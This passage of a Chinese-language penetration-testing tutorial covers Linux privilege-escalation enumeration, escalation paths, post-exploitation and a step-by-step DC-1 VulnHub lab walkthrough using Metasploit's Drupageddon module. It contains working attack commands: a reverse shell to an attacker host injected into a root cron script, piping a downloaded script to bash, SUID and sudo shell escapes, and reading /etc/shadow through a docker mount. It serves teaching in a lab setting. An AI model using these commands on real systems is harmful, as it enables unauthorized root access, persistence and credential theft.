+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>cat<span class="w"> </span>/etc/os-release<span class="w">            </span><span class="c1"># Ubuntu 20.04? CentOS 7?</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>cat<span class="w"> </span>/etc/passwd<span class="w">                </span><span class="c1"># 所有用户</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>cat<span class="w"> </span>/etc/group<span class="w">                 </span><span class="c1"># 所有组</span>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="c1"># === ★最重要：你能 sudo 什么？ ===</span>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>sudo<span class="w"> </span>-l
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="c1"># 输出: (root) NOPASSWD: /usr/bin/vim</span>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="c1"># → 你可以无密码以 root 身份运行 vim！</span>
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="c1"># → GTFOBins 查: sudo vim -c &#39;:!bash&#39; → root shell！</span>
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="c1"># === 找 SUID 文件（以文件所有者权限执行） ===</span>
+<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a><span class="c1"># SUID 位=文件以 owner(root) 的权限执行</span>
+<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="c1"># 如果 /usr/bin/find 有 SUID 位:</span>
+<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="c1">#   find . -exec /bin/bash -p \; → root shell！</span>
+<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>
+<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a><span class="c1"># === 找 capabilities ===</span>
+<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="c1"># /usr/bin/python3.8 cap_setuid=ep</span>
+<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a><span class="c1"># → python 可以改自己的 UID → 改成 0(root)</span>
+<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>
+<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a><span class="c1"># === 哪些程序在定时运行？ ===</span>
+<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>cat<span class="w"> </span>/etc/crontab
+<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*/
+<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>
+<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a><span class="c1"># === 有什么配置文件（里面可能有密码）？ ===</span>
+<a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.conf&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.config&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.ini&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+<a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a>grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="w"> </span>/var/www/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+<a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a>cat<span class="w"> </span>/home/*/.bash_history<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a>
+<a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a><span class="c1"># === 网络环境 ===</span>
+<a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a>ifconfig<span class="w"> </span>/<span class="w"> </span>ip<span class="w"> </span>addr<span class="w">             </span><span class="c1"># 本机有哪些网卡</span>
+<a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a>netstat<span class="w"> </span>-tlnp<span class="w">                  </span><span class="c1"># ★ 本机监听的端口——可能有只监听 localhost 的服务</span>
+<a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a>arp<span class="w"> </span>-a<span class="w">                         </span><span class="c1"># ARP 缓存——内网还有哪些机器</span>
+</code></pre></div>
+<h3 id="52">5.2 常见提权路径速查<a class="headerlink" href="#52" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>① sudo 配置错误:
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>   sudo -l → 看到可无密码执行的程序 → 去 GTFOBins 查利用方法
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>   例: sudo vim → :!bash → root
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>② SUID 文件利用:
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>   find / -perm -4000 → 发现 /usr/bin/bash 有 SUID 位
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>   → bash -p (保留特权) → root
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>③ 内核漏洞:
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>   uname -a → Linux 4.15.0
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>   searchsploit linux kernel 4.15 → DirtyCow? OverlayFS?
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>   下载 C 源码 → 编译 → 执行 → root
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>④ 配置文件泄露密码:
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>   grep -r &quot;password&quot; /var/www 2&gt;/dev/null
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>   → 发现 config.php 里有 mysql 密码
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>   → 用同样的密码试 root → 很多人用同一个密码！
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>   → su - root → 输入密码 → root
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>
+<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>⑤ 定时任务注入:
+<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>   cat /etc/crontab → 发现 root 每分钟执行 /opt/backup.sh
+<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>   → ls -la /opt/backup.sh → 发现可写！
+<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>   → echo &quot;bash -i &gt;&amp; /dev/tcp/攻击机/5555 0&gt;&amp;1&quot; &gt;&gt; /opt/backup.sh
+<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>   → 等一分钟 → root shell 弹过来了
+<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>
+<a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>⑥ Docker 组提权:
+<a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>   groups → docker
+<a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>   docker run -v /:/mnt -it alpine /bin/sh
+<a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>   → 整个宿主机根目录被挂载到 /mnt
+<a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>   → cat /mnt/etc/shadow → 拿到所有密码哈希
+<a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a>
+<a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a>⑦ PATH 劫持:
+<a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a>   有 root 的定时任务调用 mysqldump（没有绝对路径 /usr/bin/mysqldump）
+<a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a>   → 你在 /tmp 下写一个假的 mysqldump 脚本
+<a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a>   → export PATH=/tmp:$PATH
+<a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a>   → 定时任务执行你的假脚本 → root
+<a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a>
+<a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a>⑧ 密码复用:
+<a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a>   在配置文件中找到 admin 用户的密码
+<a id="__codelineno-15-40" name="__codelineno-15-40" href="#__codelineno-15-40"></a>   → su admin → su root（用同一个密码）→ root
+<a id="__codelineno-15-41" name="__codelineno-15-41" href="#__codelineno-15-41"></a>   （人们真的一直在用同一个密码）
+</code></pre></div>
+<h3 id="_6">🔍 提权速查资源<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>GTFOBins (https://gtfobins.github.io):
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>  → 搜任何能 sudo 的命令 → 看怎么利用
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>linPEAS (https://github.com/carlospolop/PEASS-ng):
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>  → 自动化提权信息收集，一条命令全部搞定
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>  → 上传到目标机: curl -L URL | bash
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>Linux Exploit Suggester:
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>  → 给你内核版本 → 列出可能的内核漏洞
+</code></pre></div>
+<hr />
+<h2 id="6">6. 后渗透与横向移动<a class="headerlink" href="#6" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>拿到 root 后:
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>  ① 维持访问: 放 SSH 公钥、加 crontab 反弹 shell
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>  ② 收集凭证: /etc/shadow (hashcat 爆)、浏览器密码、配置文件
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>  ③ 横向移动: arp -a 看内网邻居 → SSH/PSExec 过去 → 重复整个过程
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>  ④ 痕迹清理: 删除日志、bash_history（但渗透测试中通常保留→用于写报告）
+</code></pre></div>
+<hr />
+<h2 id="7-dc-1">7. 🧪 全程跟做：DC-1 靶机完整渗透<a class="headerlink" href="#7-dc-1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>DC-1 是 VulnHub 上经典入门靶机。这是你第一个完整渗透的 step-by-step。</p>
+</blockquote>
+<h3 id="_7">环境搭建<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>攻击机: Kali Linux (VMware/VirtualBox, 桥接模式)
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>靶机: DC-1 (从 vulnhub.com 下载, 导入 VM, 桥接模式)
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>要求: 攻击机和靶机在同一个网段（都用桥接）
+</code></pre></div>
+<h3 id="12">完整 12 步<a class="headerlink" href="#12" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>========== 阶段 1: 信息收集 ==========
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>Step 1: 发现靶机 IP
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>  kali$ sudo netdiscover -r 192.168.1.0/24
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>  或者: nmap -sP 192.168.1.0/24
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>  → 找到 DC-1 的 IP（假设 192.168.1.100）
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>Step 2: 端口扫描
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>  kali$ nmap -sV -sC -p- 192.168.1.100 -oA dc1_scan
+<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>  → 发现: 22(SSH), 80(HTTP Apache), 111(rpcbind), ...还有 Drupal
+<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>
+<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>Step 3: Web 侦查
+<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>  浏览器打开 http://192.168.1.100
+<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>  → Drupal 7 网站！
+<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>  → 查看页面源码 → 搜 version → Drupal 7.x
+<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>
+<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>========== 阶段 2: 漏洞发现 ==========
+<a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>
+<a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>Step 4: 找 Drupal 7 漏洞
+<a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a>  kali$ searchsploit Drupal 7
+<a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>  → Drupal 7.x SQL Injection (CVE-2014-3704) —— &quot;Drupageddon&quot;
+<a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a>  → 这个漏洞不需要认证！直接拿管理权限！
+<a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a>
+<a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a>========== 阶段 3: 漏洞利用 ==========
+<a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a>
+<a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a>Step 5: 用 Metasploit 打漏洞
+<a id="__codelineno-19-27" name="__codelineno-19-27" href="#__codelineno-19-27"></a>  kali$ msfconsole
+<a id="__codelineno-19-28" name="__codelineno-19-28" href="#__codelineno-19-28"></a>  msf6 &gt; search Drupageddon
+<a id="__codelineno-19-29" name="__codelineno-19-29" href="#__codelineno-19-29"></a>  msf6 &gt; use exploit/multi/http/drupal_drupageddon
+<a id="__codelineno-19-30" name="__codelineno-19-30" href="#__codelineno-19-30"></a>  msf6 &gt; set RHOSTS 192.168.1.100
+<a id="__codelineno-19-31" name="__codelineno-19-31" href="#__codelineno-19-31"></a>  msf6 &gt; set RPORT 80
+<a id="__codelineno-19-32" name="__codelineno-19-32" href="#__codelineno-19-32"></a>  msf6 &gt; run
+<a id="__codelineno-19-33" name="__codelineno-19-33" href="#__codelineno-19-33"></a>  → 拿到 meterpreter shell！
+<a id="__codelineno-19-34" name="__codelineno-19-34" href="#__codelineno-19-34"></a>
+<a id="__codelineno-19-35" name="__codelineno-19-35" href="#__codelineno-19-35"></a>Step 6: 升级到正常 shell
+<a id="__codelineno-19-36" name="__codelineno-19-36" href="#__codelineno-19-36"></a>  meterpreter &gt; shell
+<a id="__codelineno-19-37" name="__codelineno-19-37" href="#__codelineno-19-37"></a>  python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+<a id="__codelineno-19-38" name="__codelineno-19-38" href="#__codelineno-19-38"></a>
+<a id="__codelineno-19-39" name="__codelineno-19-39" href="#__codelineno-19-39"></a>========== 阶段 4: 后渗透 ==========
+<a id="__codelineno-19-40" name="__codelineno-19-40" href="#__codelineno-19-40"></a>
+<a id="__codelineno-19-41" name="__codelineno-19-41" href="#__codelineno-19-41"></a>Step 7: 第一次信息收集
+<a id="__codelineno-19-42" name="__codelineno-19-42" href="#__codelineno-19-42"></a>  whoami → www-data
+<a id="__codelineno-19-43" name="__codelineno-19-43" href="#__codelineno-19-43"></a>  uname -a → Linux DC-1 3.2.0
+<a id="__codelineno-19-44" name="__codelineno-19-44" href="#__codelineno-19-44"></a>  cat /etc/passwd → flag4 用户
+<a id="__codelineno-19-45" name="__codelineno-19-45" href="#__codelineno-19-45"></a>
+<a id="__codelineno-19-46" name="__codelineno-19-46" href="#__codelineno-19-46"></a>Step 8: 找数据库密码
+<a id="__codelineno-19-47" name="__codelineno-19-47" href="#__codelineno-19-47"></a>  cat /var/www/sites/default/settings.php
+<a id="__codelineno-19-48" name="__codelineno-19-48" href="#__codelineno-19-48"></a>  → 发现数据库用户名和密码: dbuser / R0ck3t
+<a id="__codelineno-19-49" name="__codelineno-19-49" href="#__codelineno-19-49"></a>
+<a id="__codelineno-19-50" name="__codelineno-19-50" href="#__codelineno-19-50"></a>Step 9: 登录数据库
+<a id="__codelineno-19-51" name="__codelineno-19-51" href="#__codelineno-19-51"></a>  mysql -u dbuser -pR0ck3t
+<a id="__codelineno-19-52" name="__codelineno-19-52" href="#__codelineno-19-52"></a>  mysql&gt; show databases;
+<a id="__codelineno-19-53" name="__codelineno-19-53" href="#__codelineno-19-53"></a>  mysql&gt; use drupaldb;
+<a id="__codelineno-19-54" name="__codelineno-19-54" href="#__codelineno-19-54"></a>  mysql&gt; select name,pass from users;
+<a id="__codelineno-19-55" name="__codelineno-19-55" href="#__codelineno-19-55"></a>  → admin / $S$D... (Drupal 的哈希)
+<a id="__codelineno-19-56" name="__codelineno-19-56" href="#__codelineno-19-56"></a>  → 修改 admin 密码:
+<a id="__codelineno-19-57" name="__codelineno-19-57" href="#__codelineno-19-57"></a>  mysql&gt; update users set pass=&#39;$S$C...&#39; where name=&#39;admin&#39;;
+<a id="__codelineno-19-58" name="__codelineno-19-58" href="#__codelineno-19-58"></a>  (需要用 Drupal 的密码哈希工具生成)
+<a id="__codelineno-19-59" name="__codelineno-19-59" href="#__codelineno-19-59"></a>
+<a id="__codelineno-19-60" name="__codelineno-19-60" href="#__codelineno-19-60"></a>Step 10: 收集更多信息
+<a id="__codelineno-19-61" name="__codelineno-19-61" href="#__codelineno-19-61"></a>  find / -name &quot;flag*.txt&quot; 2&gt;/dev/null
+<a id="__codelineno-19-62" name="__codelineno-19-62" href="#__codelineno-19-62"></a>  → /home/flag4/flag4.txt
+<a id="__codelineno-19-63" name="__codelineno-19-63" href="#__codelineno-19-63"></a>  flag4 的提示: &quot;use the same method to find or access the root flag&quot;
+<a id="__codelineno-19-64" name="__codelineno-19-64" href="#__codelineno-19-64"></a>
+<a id="__codelineno-19-65" name="__codelineno-19-65" href="#__codelineno-19-65"></a>========== 阶段 5: 提权 ==========
+<a id="__codelineno-19-66" name="__codelineno-19-66" href="#__codelineno-19-66"></a>
+<a id="__codelineno-19-67" name="__codelineno-19-67" href="#__codelineno-19-67"></a>Step 11: 找 SUID 文件
+<a id="__codelineno-19-68" name="__codelineno-19-68" href="#__codelineno-19-68"></a>  find / -perm -4000 -type f 2&gt;/dev/null
+<a id="__codelineno-19-69" name="__codelineno-19-69" href="#__codelineno-19-69"></a>  → /usr/bin/find 有 SUID 位！
+<a id="__codelineno-19-70" name="__codelineno-19-70" href="#__codelineno-19-70"></a>  → cd /tmp &amp;&amp; touch test
+<a id="__codelineno-19-71" name="__codelineno-19-71" href="#__codelineno-19-71"></a>  → find test -exec /bin/sh -p \;
+<a id="__codelineno-19-72" name="__codelineno-19-72" href="#__codelineno-19-72"></a>  → whoami → root！
+<a id="__codelineno-19-73" name="__codelineno-19-73" href="#__codelineno-19-73"></a>
+<a id="__codelineno-19-74" name="__codelineno-19-74" href="#__codelineno-19-74"></a>Step 12: 拿 flag！
+<a id="__codelineno-19-75" name="__codelineno-19-75" href="#__codelineno-19-75"></a>  cd /root
+<a id="__codelineno-19-76" name="__codelineno-19-76" href="#__codelineno-19-76"></a>  cat thefinalflag.txt
+<a id="__codelineno-19-77" name="__codelineno-19-77" href="#__codelineno-19-77"></a>  → 🎉 恭喜！你完成了第一次完整渗透！
+</code></pre></div>
+<hr />
+<h2 id="8">8. 写好渗透报告<a class="headerlink" href="#8" title="Permanent link">&para;</a></h2>
+<p>一份专业的渗透报告应该包括：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>1. 执行摘要（给老板看）
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>   - 发现了什么级别的漏洞
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>   - 可能造成的最大损失
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>   - 总体风险评级
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>2. 测试范围与方法
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>   - 测试了哪些 IP/域名/系统
+<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>   - 用了什么方法（黑盒/白盒/灰盒）
+<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>   - 测试时间范围
+<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>
+<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>3. 漏洞详情（每个漏洞一页）
+<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>   - 漏洞名称 + CVE 编号
+<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>   - 风险等级（高/中/低）
+<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a>   - 发现过程（你是怎么找到的）
+<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a>   - 复现步骤（别人照着做也能复现）
+<a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>   - 截图/代码块（证据）
+<a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a>   - 危害分析（利用这个漏洞能拿到什么）
+<a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>   - 修复建议（具体到命令/配置）
+<a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a>
+<a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a>4. 附录
+<a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a>   - 所有 nmap 扫描结果
+<a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a>   - 所有工具的输出
+</code></pre></div>
+<hr />
+<h2 id="_8">🛠️ 工具清单速查<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>工具</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>信息收集</td>
+<td>nmap</td>
+<td>端口扫描</td>
+</tr>
+<tr>
+<td>信息收集</td>
+<td>gobuster/dirsearch/ffuf</td>
+<td>目录枚举</td>
+</tr>
+<tr>
+<td>信息收集</td>
+<td>subfinder/amass</td>
+<td>子域名</td>
+</tr>
+<tr>
+<td>信息收集</td>
+<td>whatweb/wappalyzer</td>
+<td>技术栈识别</td>
+</tr>
+<tr>
+<td>信息收集</td>
+<td>Shodan/Censys</td>
+<td>搜索引擎</td>
+</tr>
+<tr>
+<td>漏洞扫描</td>
+<td>Nikto</td>
+<td>Web 扫描</td>
+</tr>
+<tr>
+<td>漏洞扫描</td>
+<td>sqlmap</td>
+<td>SQL 注入自动化</td>
+</tr>
+<tr>
+<td>漏洞扫描</td>
+<td>searchsploit</td>
+<td>公开漏洞搜索</td>
+</tr>
+<tr>
+<td>漏洞利用</td>
+<td>Metasploit</td>
+<td>漏洞利用框架</td>
+</tr>
+<tr>
+<td>漏洞利用</td>
+<td>BurpSuite</td>
+<td>HTTP 抓包改包</td>
+</tr>
+<tr>
+<td>漏洞利用</td>
+<td>蚁剑/冰蝎</td>
+<td>Webshell 管理</td>
+</tr>
+<tr>
+<td>提权</td>
+<td>linPEAS/WinPEAS</td>
+<td>自动化信息收集</td>
+</tr>
+<tr>
+<td>提权</td>
+<td>GTFOBins</td>
+<td>提权手法速查</td>
+</tr>
+<tr>
+<td>密码破解</td>
+<td>hashcat/john</td>
+<td>离线破解</td>
+</tr>
+<tr>
+<td>密码爆破</td>
+<td>hydra/medusa</td>
+<td>在线爆破</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_9">📝 复习自检<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能说出渗透测试的五个标准阶段</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 会用 nmap 做端口扫描和版本识别</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能用 gobuster/dirsearch 枚举 Web 目录</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 知道拿到 webshell 后怎么弹一个完整的 reverse shell</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 知道 sudo -l 是提权时最重要的命令</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能说出至少 5 种 Linux 提权方式</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能在 VulnHub 靶机上独立完成一次完整渗透（DC-1 起步）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 知道怎么写一份渗透报告</li>
+</ul>
+<hr />
+<h2 id="_10">🎬 推荐靶场与平台<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>平台</th>
+<th style="text-align: center;">难度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>VulnHub: DC-1 ~ DC-9</td>
+<td style="text-align: center;">⭐~⭐⭐</td>
+<td>经典系列，从入门到进阶</td>
+</tr>
+<tr>
+<td>VulnHub: Mr-Robot</td>
+<td style="text-align: center;">⭐⭐</td>
+<td>美剧主题，有趣</td>
+</tr>
+<tr>
+<td>HackTheBox: Starting Point</td>
+<td style="text-align: center;">⭐~⭐⭐</td>
+<td>免费入门机器</td>
+</tr>
+<tr>
